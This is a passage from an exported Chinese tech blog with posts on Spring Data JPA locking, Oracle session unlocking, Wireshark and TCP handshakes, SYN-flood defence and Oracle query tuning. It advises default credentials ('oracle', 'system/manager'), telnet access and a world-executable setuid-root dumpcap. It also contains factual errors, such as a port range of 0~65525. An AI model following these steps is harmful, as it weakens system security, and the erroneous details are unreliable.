class="line"><span class="function">Integer <span class="title">explicitlyNamedPlus1inout</span><span class="params">(Integer arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Referencing implicitly mapped procedure with name "plus1inout" in database via procedureName alias.</span></span><br><span class="line"><span class="meta">@Procedure</span>(procedureName = <span class="string">"plus1inout"</span>)</span><br><span class="line"><span class="function">Integer <span class="title">plus1inout</span><span class="params">(Integer arg)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Referencing explicitly mapped named stored procedure "User.plus1IO" in EntityManager.</span></span><br><span class="line"><span class="meta">@Procedure</span>(name = <span class="string">"User.plus1IO"</span>)</span><br><span class="line"><span class="function">Integer <span class="title">entityAnnotatedCustomNamedProcedurePlus1IO</span><span class="params">(@Param(<span class="string">"arg"</span>)</span> Integer arg)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Referencing implicitly mapped named stored procedure "User.plus1" in EntityManager via method-name.</span></span><br><span class="line"><span class="meta">@Procedure</span></span><br><span class="line"><span class="function">Integer <span class="title">plus1</span><span class="params">(@Param(<span class="string">"arg"</span>)</span> Integer arg)</span>;</span><br></pre></td></tr></table></figure><h2 id="JPA实现锁表"><a href="#JPA实现锁表" class="headerlink" title="JPA实现锁表"></a>JPA实现锁表</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Defining lock metadata on query methods</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">Repository</span>&lt;<span class="title">User</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Plain query method</span></span><br><span class="line">  <span class="meta">@Lock</span>(LockModeType.READ)</span><br><span class="line">  <span class="function">List&lt;User&gt; <span class="title">findByLastname</span><span class="params">(String lastname)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Defining lock metadata on CRUD methods</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">Repository</span>&lt;<span class="title">User</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Redeclaration of a CRUD method</span></span><br><span class="line">  <span class="meta">@Lock</span>(LockModeType.READ);</span><br><span class="line">  <span class="function">List&lt;User&gt; <span class="title">findAll</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行级锁</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.LockModeType;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Lock;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.data.repository.query.Param;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.xxx.xx.core.entity.UserInfo;  </span><br><span class="line"><span class="meta">@Repository</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserInfoDao</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">UserInfo</span>, <span class="title">Long</span>&gt; </span>&#123;  </span><br><span class="line">    <span class="meta">@Query</span>(value = <span class="string">"select j from UserInfo j where j.userName = :username "</span>)  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserInfo <span class="title">getUserForUpdate</span><span class="params">(@Param(<span class="string">"username"</span>)</span> String username)</span>;  </span><br><span class="line">    <span class="meta">@Lock</span>(value = LockModeType.PESSIMISTIC_WRITE)  </span><br><span class="line">    <span class="meta">@Query</span>(value = <span class="string">"select j from UserInfo j where j.id = :id "</span>)  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUserByIdForUpdate</span><span class="params">(@Param(<span class="string">"id"</span>)</span> Long id)</span>;  </span><br><span class="line">    <span class="meta">@Lock</span>(value = LockModeType.PESSIMISTIC_WRITE) <span class="comment">// 会锁整个表</span></span><br><span class="line">    <span class="meta">@Query</span>(value = <span class="string">"select j from UserInfo j where j.userName = :username "</span>)  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUserByNameForUpdate</span><span class="params">(@Param(<span class="string">"username"</span>)</span> String username)</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserService</span> <span class="keyword">implements</span> <span class="title">IUserService</span> </span>&#123;  </span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    <span class="keyword">private</span> UserInfoDao UserInfoDao;  </span><br><span class="line">    <span class="meta">@Transactional</span> <span class="comment">// 这个是需要标注的，因为Dao层有for update 的机制，那么这边就要开启事务了，否则会报错的。。。  </span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserInfo <span class="title">getUserForUpdate</span><span class="params">(Long id)</span> </span>&#123;  </span><br><span class="line">        UserInfoDao.getUserByIdForUpdate(id);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Thread.sleep(<span class="number">100000</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要明确的指定主键，才会执行行级锁，否则执行的为表锁。<br><a href="http://blog.sina.com.cn/s/blog_88d2d8f501011sgl.html">MySQL中select * for update锁表的问题</a></p><p>悲观所和乐观锁问题，这里的乐观锁比较简单，jpa有提供注解@Version，加上该注解，自动实现乐观锁，byId修改的时候sql自动变成：<code>update ... set ... where id = ? and version = ?</code>，比较方便。</p><p>在<code>Oracle</code>中，使用其他条件时，会在使用该数据集，如list时，锁表。形成多条锁表SQL语句。并不会直接表锁。</p><h2 id="Oracle锁表，解锁的一些描述"><a href="#Oracle锁表，解锁的一些描述" class="headerlink" title="Oracle锁表，解锁的一些描述"></a>Oracle锁表，解锁的一些描述</h2><h3 id="锁表"><a href="#锁表" class="headerlink" title="锁表"></a>锁表</h3><p>增删改查，封锁粒度都为行级。<br>事务锁（TX）<br>| 语句|类型|模式|<br>| —–|——-|————|<br>|<code>Insert</code>|TX|排它（X）|<br>|<code>Update</code>|TX|排它（X）|<br>|<code>Delete</code>|TX|排它（X）|<br>|<code>Select</code>|TX|排它（X）|</p><p>通常的DML操作（SELECT…FOR UPDATE、INSERT、UPDATE、DELETE），在表级获得的只是意向锁（RS或RX），其真正的封锁粒度还是在行级；另外，Oracle数据库的一个显著特点是，在缺省情况下，单纯地读数据（SELECT）并不加锁，Oracle通过回滚段（Rollback segment）来保证用户不读”脏”数据。这些都提高了系统的并发程度。<br>由于意向锁及数据行上锁标志位的引入，减小了Oracle维护行级锁的开销，这些技术的应用使Oracle能够高效地处理高度并发的事务请求。<br>锁表粒度<a href="http://www.oracle.com/technetwork/cn/community/developer-day/2-oracle-db-data-block-mechanism-2048769-zhs.pdf">Oracle 数据封锁机制</a></p><h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>oracle 进程锁死 解锁<br>su - oracle</p><p>telnet 到服务器（用户；密码都是 oracle）运行下面的命令：<br>sqlplus system/manager as sysdba<br>再执行下面的Sql代码<br>select sess.sid,sess.serial#,lo.oracle_username,lo.os_user_name,ao.object_name,lo.locked_mode from v$locked_object lo,dba_objects ao,v$session sess where ao.object_id = lo.object_id and lo.session_id = sess.sid;<br>杀掉锁表进程：<br>如有記錄則表示有lock，記錄下SID 和 serial# ，將記錄的ID替換下面的738,1429，即可解除LOCK<br>alter system kill session ‘738,1429’;</p><p>select distinct t2.username,<br>‘alter system kill session ‘’’ || t2.sid || ‘,’ ||<br>t2.serial# || ‘’’’ || ‘;’,<br>t3.object_name 被锁表名,<br>t4.spid 进程号,<br>t2.osuser os用户名,<br>t2.program 程序名<br>from v$locked_object t1<br>inner join v$session t2<br>on t1.session_id = t2.sid<br>inner join dba_objects t3<br>on t1.object_id = t3.object_id<br>inner join v$process t4<br>on t2.paddr = t4.addr;</p><h2 id="常用JPA方法"><a href="#常用JPA方法" class="headerlink" title="常用JPA方法"></a>常用JPA方法</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>1、查询所有数据 <code>findAll()</code></p><p>2、分页查询 <code>findAll(new PageRequest(0, 2))</code></p><p>3、根据id查询 <code>findOne()</code></p><p>4、根据实体类属性查询： <code>findByProperty (type Property);</code> 例如：<code>findByAge(int age);</code></p><p>5、排序： <code>findAll(sort )</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Sort sort = <span class="keyword">new</span> Sort(Sort.Direction.DESC, <span class="string">"age"</span>).and (<span class="keyword">new</span> Sort(Sort.Direction.DESC, <span class="string">"id"</span>));</span><br></pre></td></tr></table></figure><p>6、条件查询 <code>and/or/findByAgeLessThan/LessThanEqual</code> 等，</p><pre><code>例如： `findByUsernameAndPassword(String username , String password)`</code></pre><p>7、总数 查询 <code>count()</code> 或者 根据某个属性的值查询总数<code>countByAge(int age);</code></p><p>8、是否存在某个id <code>exists()</code></p><h3 id="修改，删除，新增"><a href="#修改，删除，新增" class="headerlink" title="修改，删除，新增"></a>修改，删除，新增</h3><ol><li>新增：直接使用 <code>save(T)</code> 方法</li><li>删除： <code>delete()</code> 或者 <code>deleteByProperty</code> 例如：<code>deleteByAge(int age)</code> ;</li><li>更新：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Modifying</span> </span><br><span class="line"><span class="meta">@Query</span>(<span class="string">"update Customer u set u.age = ?1 where u.id = ?2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> age1 , <span class="keyword">long</span> id)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><h3 id="官网其他示例，方法名内支持的关键字"><a href="#官网其他示例，方法名内支持的关键字" class="headerlink" title="官网其他示例，方法名内支持的关键字"></a>官网其他示例，方法名内支持的关键字</h3><p>方法名内支持的关键字</p><table><thead><tr><th>Keyword</th><th align="center">Sample</th><th>JPQL snippet</th></tr></thead><tbody><tr><td><code>And</code></td><td align="center"><code>findByLastnameAndFirstname</code></td><td><code>… where x.lastname = ?1 and x.firstname = ?2</code></td></tr><tr><td><code>Or</code></td><td align="center"><code>findByLastnameOrFirstname</code></td><td><code>… where x.lastname = ?1 or x.firstname = ?2</code></td></tr><tr><td><code>Is,Equals</code></td><td align="center"><code>findByFirstname,findByFirstnameIs,findByFirstnameEquals</code></td><td><code>… where x.firstname = 1?</code></td></tr><tr><td><code>Between</code></td><td align="center"><code>findByStartDateBetween</code></td><td><code>… where x.startDate between 1? and ?2</code></td></tr><tr><td><code>LessThan</code></td><td align="center"><code>findByAgeLessThan</code></td><td><code>… where x.age &amp;lt; ?1</code></td></tr><tr><td><code>LessThanEqual</code></td><td align="center"><code>findByAgeLessThanEqual</code></td><td><code>… where x.age &amp;#8656; ?1</code></td></tr><tr><td><code>GreaterThan</code></td><td align="center"><code>findByAgeGreaterThan</code></td><td><code>… where x.age &amp;gt; ?1</code></td></tr><tr><td><code>GreaterThanEqual</code></td><td align="center"><code>findByAgeGreaterThanEqual</code></td><td><code>… where x.age &amp;gt;= ?1</code></td></tr><tr><td><code>After</code></td><td align="center"><code>findByStartDateAfter</code></td><td><code>… where x.startDate &amp;gt; ?1</code></td></tr><tr><td><code>Before</code></td><td align="center"><code>findByStartDateBefore</code></td><td><code>… where x.startDate &amp;lt; ?1</code></td></tr><tr><td><code>IsNull</code></td><td align="center"><code>findByAgeIsNull</code></td><td><code>… where x.age is null</code></td></tr><tr><td><code>IsNotNull,NotNull</code></td><td align="center"><code>findByAge(Is)NotNull</code></td><td><code>… where x.age not null</code></td></tr><tr><td><code>Like</code></td><td align="center"><code>findByFirstnameLike</code></td><td><code>… where x.firstname like ?1</code></td></tr><tr><td><code>NotLike</code></td><td align="center"><code>findByFirstnameNotLike</code></td><td><code>… where x.firstname not like ?1</code></td></tr><tr><td><code>StartingWith</code></td><td align="center"><code>findByFirstnameStartingWith</code></td><td><code>… where x.firstname like ?1 (parameter bound with appended %)</code></td></tr><tr><td><code>EndingWith</code></td><td align="center"><code>findByFirstnameEndingWith</code></td><td><code>… where x.firstname like ?1 (parameter bound with prepended %)</code></td></tr><tr><td><code>Containing</code></td><td align="center"><code>findByFirstnameContaining</code></td><td><code>… where x.firstname like ?1 (parameter bound wrapped in %)</code></td></tr><tr><td><code>OrderBy</code></td><td align="center"><code>findByAgeOrderByLastnameDesc</code></td><td><code>… where x.age = ?1 order by x.lastname desc</code></td></tr><tr><td><code>Not</code></td><td align="center"><code>findByLastnameNot</code></td><td><code>… where x.lastname &amp;lt;&amp;gt; ?1</code></td></tr><tr><td><code>In</code></td><td align="center"><code>findByAgeIn(Collection&amp;lt;Age&amp;gt; ages)</code></td><td><code>… where x.age in ?1</code></td></tr><tr><td><code>NotIn</code></td><td align="center"><code>findByAgeNotIn(Collection&amp;lt;Age&amp;gt; age)</code></td><td><code>… where x.age not in ?1</code></td></tr><tr><td><code>True</code></td><td align="center"><code>findByActiveTrue()</code></td><td><code>… where x.active = true</code></td></tr><tr><td><code>False</code></td><td align="center"><code>findByActiveFalse()</code></td><td><code>… where x.active = false</code></td></tr><tr><td><code>IgnoreCase</code></td><td align="center"><code>findByFirstnameIgnoreCase</code></td><td><code>… where UPPER(x.firstame) = UPPER(?1)</code></td></tr></tbody></table>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>jpa</tag>
        <tag>Oracle解锁</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark的一些使用笔记</title>
    <url>/2017/11/09/notes-for-wireshark/</url>
    <content><![CDATA[<p>Wireshark（前称Ethereal）是一个免费开源的网络嗅探程序，网络数据包分析软件。网络数据包分析软件的功能是截取网络数据包，并尽可能显示出最为详细的网络数据包数据。</p><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="抓取报文"><a href="#抓取报文" class="headerlink" title="抓取报文"></a>抓取报文</h3><p>下载和安装好Wireshark之后，启动Wireshark并且在接口列表中选择接口名，然后开始在此接口上抓包。<br>点击接口名称之后，就可以看到实时接收的报文。Wireshark会捕捉系统发送和接收的每一个报文。如果抓取的接口是无线并且选项选取的是混合模式，那么也会看到网络上其他报文。<br>上端面板每一行对应一个网络报文，默认显示报文接收时间（相对开始抓取的时间点），源和目标IP地址，使用协议和报文相关信息。点击某一行可以在下面两个窗口看到更多信息。“+”图标显示报文里面每一层的详细信息。底端窗口同时以十六进制和ASCII码的方式列出报文内容。<br>需要停止抓取报文的时候，点击左上角的停止捕获分组按键。</p><blockquote><ul><li>色彩标识:</li></ul></blockquote><p>进行到这里已经看到报文以绿色，蓝色，黑色显示出来。Wireshark通过颜色让各种流量的报文一目了然。比如默认绿色是TCP报文，深蓝色是DNS，浅蓝是UDP，黑色标识出有问题的TCP报文——比如乱序报文。</p><blockquote><ul><li>报文样本:</li></ul></blockquote><p>比如说你在家安装了Wireshark，但家用LAN环境下没有感兴趣的报文可供观察，那么可以去Wireshark wiki下载<a href="http://wiki.wireshark.org/SampleCaptures">报文样本文件</a>。<br>打开一个抓取文件相当简单，在主界面上点击Open并浏览文件即可。也可以在Wireshark里保存自己的抓包文件并稍后打开。</p><h3 id="过滤报文"><a href="#过滤报文" class="headerlink" title="过滤报文"></a>过滤报文</h3><p>如果正在尝试分析问题，比如打电话的时候某一程序发送的报文，可以关闭所有其他使用网络的应用来减少流量。但还是可能有大批报文需要筛选，这时要用到Wireshark过滤器。<br>最基本的方式就是在窗口顶端过滤栏输入并点击Apply（或按下回车）。例如，输入“dns”就会只看到DNS报文。输入的时候，Wireshark会帮助自动完成过滤条件。</p><p>也可使用<code>ip.src ==192.168.1.2 or ip.dst==192.168.1.2</code>只查看源地址或者目标地址是192.168.1.2的报文。<br>其他常用示例<br><code>tcp.port ==80</code>, 端口为80的<br><code>tcp.srcport == 80</code>, 只显示TCP协议的原端口为80的<br><code>http.request.method == GET</code>, 只显示HTTP GET方法的。</p><p>也可以点击Analyze菜单并选择Display Filters来创建新的过滤条件。</p><p>另一件很有趣的事情是你可以右键报文并选择Follow TCP Stream，即是追踪流 -&gt; TCP流。你会看到在服务器和目标端之间的全部会话。关闭窗口之后，你会发现过滤条件自动被引用了——Wireshark显示构成会话的报文。eg:tcp.stream eq 0.<br>客户端报文用红色表示服务器报文则为蓝色。更改为十六进制Dump模式查看载荷的十六进制代码.关闭弹出窗口，Wireshark就只显示所选TCP报文流。现在可以轻松分辨出3次握手信号。</p><h3 id="检查报文"><a href="#检查报文" class="headerlink" title="检查报文"></a>检查报文</h3><p>选中一个报文之后，就可以深入挖掘它的内容了。<br>也可以在这里创建过滤条件——只需右键细节并使用Apply as Filter子菜单，就可以根据此细节创建过滤条件。</p><p><a href="https://community.emc.com/thread/194901">一站式学习Wireshark</a><br><a href="https://www.wireshark.org/docs/wsug_html">官方Wireshark使用文档</a></p><h2 id="查看TCP协议"><a href="#查看TCP协议" class="headerlink" title="查看TCP协议"></a>查看TCP协议</h2><p><a href="http.cap">报文样本</a></p><p>过滤条件，192.168.0.1建立TCP连接<br><code>ip.src==192.168.0.1 and tcp.flags.syn==1</code></p><p>注意：Find Packet也可以用于搜索十六进制字符，比如恶意软件信号，或搜索字符串，比如抓包文件中的协议命令。</p><h3 id="TCP-三次握手建立连接"><a href="#TCP-三次握手建立连接" class="headerlink" title="TCP 三次握手建立连接"></a>TCP 三次握手建立连接</h3><p>TCP/IP通过三次握手建立一个连接。这一过程中的三种报文是：SYN，SYN/ACK，ACK。</p><p>上真相图<br><img alt="图解TCP三次握手" data-src="Connection_TCP.png"></p><p>第一次请求客户端发送一个SYN包，序列号是0。<br><img alt="SYN" data-src="TCP_CONNECT_SYN.PNG"></p><p>第二次请求服务器会发送一个SYN和一个ACK包，序列号是0，ack号是1。<br><img alt="SYN,ACK" data-src="TCP_CONNECT_SYN_ACK.PNG"></p><p>第三次本地客户端请求会发送一个ACK包，序列号是1，ack号是1来回复服务器。<br><img alt="ACK" data-src="TCP_CONNECT_ACK.PNG"></p><h3 id="TCP四次挥手关闭连接"><a href="#TCP四次挥手关闭连接" class="headerlink" title="TCP四次挥手关闭连接"></a>TCP四次挥手关闭连接</h3><p>TCP/IP通过四次挥手关闭一个连接。这一过程中的三种报文是：FIN，FIN/ACK，ACK。</p><p><img alt="图解TCP四次挥手" data-src="Deconnection_TCP.png"></p><blockquote><ul><li>第一次挥手：主机1（可以使客户端，也可以是服务器端），设置Sequence Number和Acknowledgment Number，向主机2发送一个FIN报文段；此时，主机1进入<code>FIN_WAIT_1</code>状态；这表示主机1没有数据要发送给主机2了；</li><li>第二次挥手：主机2收到了主机1发送的FIN报文段，向主机1回一个ACK报文段，Acknowledgment Number为Sequence Number加1；主机1进入<code>FIN_WAIT_2</code>状态；主机2进入<code>CLOSE-WAIT</code>状态；主机2告诉主机1，我“同意”你的关闭请求；</li><li>第三次挥手：主机2向主机1发送FIN报文段，请求关闭连接，同时主机2进入<code>LAST_ACK</code>状态；</li><li>第四次挥手：主机1收到主机2发送的FIN报文段，向主机2发送ACK报文段，然后主机1进入<code>TIME_WAIT</code>状态；主机2收到主机1的ACK报文段以后，就<code>CLOSE</code>关闭连接；此时，主机1等待2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，主机1也可以<code>CLOSE</code>关闭连接了。</li></ul></blockquote><h3 id="TCP整体"><a href="#TCP整体" class="headerlink" title="TCP整体"></a>TCP整体</h3><p><img alt="TCP整体" data-src="TCP%E6%95%B4%E4%BD%93.jpg"></p><h3 id="TCP数据包结构"><a href="#TCP数据包结构" class="headerlink" title="TCP数据包结构"></a>TCP数据包结构</h3><p><img alt="TCP数据包结构" data-src="TCP%E6%95%B0%E6%8D%AE%E5%8C%85%E7%BB%93%E6%9E%84.png"></p><p>固定首部长度为20字节,可变部分0~40字节(bits),各字段解释：</p><blockquote><ul><li>Source Port，来源连接端口（16位长）－辨识发送连接端口，范围0~65525</li><li>Destination Port，目的连接端口（16位长）－辨识接收连接端口，范围0~65525</li><li>Sequence number，序列号（seq，32位长）TCP 连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。<ul><li>如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码为本序列号加一。</li><li>如果没有同步化旗标（SYN），则此为第一个数据比特的序列码。</li></ul></li><li>Acknowledgment number，确认号（ack，32位长）—期望收到对方的下一个报文段的数据的第一个字节的序号。也即已经收到的数据的字节长度加1。</li><li>Header Length，报头长度（4位长）—以4字节为单位计算出的数据段开始地址的偏移值，即它指出报文数据距TCP报头的起始处有多远(TCP报文头长度)。</li><li>保留字段 6bits，保留今后使用，目前置0处理。</li><li>Flags，标志符，1bits<ul><li>URG：紧急比特—为1表示高优先级数据包，紧急指针字段有效。</li><li>ACK：确认比特—为1表示确认号字段有效。当 ACK=0 时，确认号无效</li><li>PSH：推送比特—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</li><li>RST：复位比特—为1表示出现严重差错，(如由于主机崩溃或其他原因)。可能需要重现创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。</li><li>SYN：同步比特—为1表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步。</li><li>FIN：终止比特—为1表示发送方没有数据要传输了，要求释放连接。</li></ul></li><li>Window size value，窗口（WIN，16位长）—表示从确认号开始，本报文的接受方可以接收的字节数，即接收窗口大小。用于流量控制。TCP 连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。</li><li>Checksum，校验和（Checksum，16位长）—对整个的TCP报文段，包括TCP头部和TCP数据，以16位字进行计算所得。这是一个强制性的字段。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。</li><li>Urgent pointer，紧急指针（16位长）—本报文段中的紧急数据的最后一个字节的序号。</li><li>选项字段—最多40字节。每个选项的开始是1字节的kind字段，说明选项的类型。<ul><li>0：选项表结束（1字节）</li><li>1：无操作（1字节）用于选项字段之间的字边界对齐。</li><li>2：最大报文段长度（4字节，Maximum Segment Size，MSS）通常在创建连接而设置SYN标志的数据包中指明这个选项，指明本端所能接收的最大长度的报文段。通常将MSS设置为（MTU-40）字节，携带TCP报文段的IP数据报的长度就不会超过MTU，从而避免本机发生IP分片。只能出现在同步报文段中，否则将被忽略。</li><li>3：窗口扩大因子（4字节，wscale），取值0-14。用来把TCP的窗口的值左移的位数。只能出现在同步报文段中，否则将被忽略。这是因为现在的TCP接收数据缓冲区（接收窗口）的长度通常大于65535字节。</li><li>4：sackOK—发送端支持并同意使用SACK选项。</li><li>5：SACK实际工作的选项。</li><li>8：时间戳（10字节，TCP Timestamps Option，TSopt）<ul><li>发送端的时间戳（Timestamp Value field，TSval，4字节）</li><li>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）</li></ul></li></ul></li></ul></blockquote><p>TCP并不是对所有的应用都适合，一些新的带有一些内在的脆弱性的运输层协议也被设计出来。比如，实时应用并不需要甚至无法忍受TCP的可靠传输机制。在这种类型的应用中，通常允许一些丢包、出错或拥塞，而不是去校正它们。例如通常不使用TCP的应用有：<strong>实时流多媒体（如因特网广播）、实时多媒体播放器和游戏、IP电话（VoIP）</strong>等等。任何不是很需要可靠性或者是想将功能减到最少的应用可以避免使用TCP。在很多情况下，当只需要多路复用应用服务时，用户数据报协议（UDP）可以代替TCP为应用提供服务。</p><h3 id="如何检测-SYN-攻击"><a href="#如何检测-SYN-攻击" class="headerlink" title="如何检测 SYN 攻击"></a>如何检测 SYN 攻击</h3><p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。在Linux/Unix上可以使用系统自带的netstats命令来检测SYN攻击</p><h3 id="如何防御SYN攻击"><a href="#如何防御SYN攻击" class="headerlink" title="如何防御SYN攻击"></a>如何防御SYN攻击</h3><p>SYN攻击不能完全被阻止，除非将TCP协议重新设计。我们所做的是尽可能的减轻SYN攻击的危害，常见的防御 SYN 攻击的方法有如下几种：</p><blockquote><ul><li>缩短超时（SYN Timeout）时间</li><li>增加最大半连接数</li><li>过滤网关防护</li><li>SYN cookies技术</li></ul></blockquote><h3 id="给wireshark添加用户权限"><a href="#给wireshark添加用户权限" class="headerlink" title="给wireshark添加用户权限"></a>给wireshark添加用户权限</h3><p>问题：普通用户没有执行权限，也打不开网络端口捕捉，因为dumpcap需要root权限。<br>产生这种问题的原因：比如：wireshark在进行插件型添加的时候，正常情况下是需要在用户权限下才可以运行插件。可以参考wireshark中的/usr/share/wireshark/init.lua 文件中的disable_lua = false语句。<br>解决办法：为普通用户提供执行wireshark权限。</p><p>Limiting capture permission to only one group</p><p>After having set dumpcap’s network privileges:</p><ol><li><p>Create user “wireshark” in group “wireshark”.</p></li><li><p>chgrp wireshark /usr/sbin/dumpcap</p></li><li><p>chmod o-rx /usr/sbin/dumpcap</p></li><li><p>Ensure Wireshark works only from root and from a user in the “wireshark” group</p></li></ol><p>1、添加wireshark用户组</p><p>sudo groupadd wireshark</p><p>2、将dumpcap更改为wireshark用户组</p><p>sudo chgrp wireshark /usr/bin/dumpcap</p><p>3、让wireshark用户组有root权限使用dumpcap</p><p>sudo chmod 4755 /usr/bin/dumpcap</p><p>(注意:如果设为4754 Wireshark还是会提示没有权限 )</p><p>4、将需要使用的普通用户名加入wireshark用户组：</p><p>sudo gpasswd -a yourname wireshark</p><p>如此，可以以普通用户yourname登陆打开Wireshark抓包</p><p>这样一来，wireshark也就支持了在普通用户的插件型添加协议的功能。</p>]]></content>
      <tags>
        <tag>Wireshark</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle分页中根据时间排序时数据重复的问题</title>
    <url>/2015/10/09/oracle-order-by-date-rownum-duplicate/</url>
    <content><![CDATA[<p>分页查询中，数据按照日期时间排序时，出现数据重复。 原因是：在数据中，日期的值不是唯一的。<br>解决方案，在根据时间排序后，增加唯一性列排序，如主键。</p><p>详见 <a href="http://blog.csdn.net/gavinloo/article/details/12782095">gavinloo的专栏</a></p><p>另外，在Oracle中一个汉字相当于3个varchar2长度，UTF-8时候<br>GBK是一个汉字两个，utf-8是一个汉字3个。</p><p>ojdbc.jar包位于以下目录<br>cd $ORACLE_HOME/jdbc/lib</p>]]></content>
      <categories>
        <category>oracle</category>
      </categories>
      <tags>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>oracle查询优化</title>
    <url>/2016/05/03/oracle-query-optimization/</url>
    <content><![CDATA[<p>（1） 选择最有效率的表名顺序(只在基于规则的优化器中有效)：　ORACLE的解析器按照从右到左的顺序处理FROM子句中的表名，FROM子句中写在最后的表(基础表 driving table)将被最先处理，在FROM子句中包含多个表的情况下,你必须选择记录条数最少的表作为基础表。如果有3个以上的表连接查询, 那就需要选择交叉表(intersection table)作为基础表, 交叉表是指那个被其他表所引用的表.<br>（2） WHERE子句中的连接顺序．：　ORACLE采用自下而上的顺序解析WHERE子句,根据这个原理,表之间的连接必须写在其他WHERE条件之前, 那些可以过滤掉最大数量记录的条件必须写在WHERE子句的末尾.<br>（3） SELECT子句中避免使用 ‘ * ‘：　ORACLE在解析的过程中, 会将’<em>’ 依次转换成所有的列名, 这个工作是通过查询数据字典完成的, 这意味着将耗费更多的时间<br>（4） 减少访问数据库的次数：　ORACLE在内部执行了许多工作: 解析SQL语句, 估算索引的利用率, 绑定变量 , 读数据块等；<br>（5） 在SQL</em>Plus , SQL<em>Forms和Pro</em>C中重新设置ARRAYSIZE参数, 可以增加每次数据库访问的检索数据量 ,建议值为200<br>（6） 使用DECODE函数来减少处理时间：　使用DECODE函数可以避免重复扫描相同记录或重复连接相同的表.<br>（7） 整合简单,无关联的数据库访问：　如果你有几个简单的数据库查询语句,你可以把它们整合到一个查询中(即使它们之间没有关系)<br>（8） 删除重复记录：　最高效的删除重复记录方法<br>( 因为使用了ROWID)例子：　DELETE FROM EMP E WHERE E.ROWID &gt;<br>(SELECT MIN(X.ROWID) FROM EMP X WHERE X.EMP_NO = E.EMP_NO);　<br>（9） 用TRUNCATE替代DELETE：　当删除表中的记录时,在通常情况下, 回滚段(rollback segments ) 用来存放可以被恢复的信息.如果你没有COMMIT事务,ORACLE会将数据恢复到删除之前的状态(准确地说是恢复到执行删除命令之前的状况) 而当运用TRUNCATE时, 回滚段不再存放任何可被恢复的信息.当命令运行后,数据不能被恢复.因此很少的资源被调用,执行时间也会很短.(译者按: TRUNCATE只在删除全表适用,TRUNCATE是DDL不是DML)　<br>（10） 尽量多使用COMMIT：　只要有可能,在程序中尽量多使用COMMIT, 这样程序的性能得到提高,需求也会因为COMMIT所释放的资源而减少: COMMIT所释放的资源:<br>a.　回滚段上用于恢复数据的信息.<br>b.　被程序语句获得的锁<br>c.　redo log buffer 中的空间<br>d.　ORACLE为管理上述3种资源中的内部花费　<br>（11） 